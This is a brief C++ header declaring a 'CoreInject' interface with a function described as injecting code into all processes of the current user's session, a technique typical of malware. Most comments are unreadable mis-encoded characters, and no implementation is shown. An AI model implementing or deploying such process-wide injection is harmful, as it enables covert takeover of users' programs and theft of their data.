/*
  �������� ���� � ��������.
*/
#pragma once

namespace CoreInject
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
  Inject code into all processes of the current session by the current user.
      */
  bool _injectToAll(void);
};
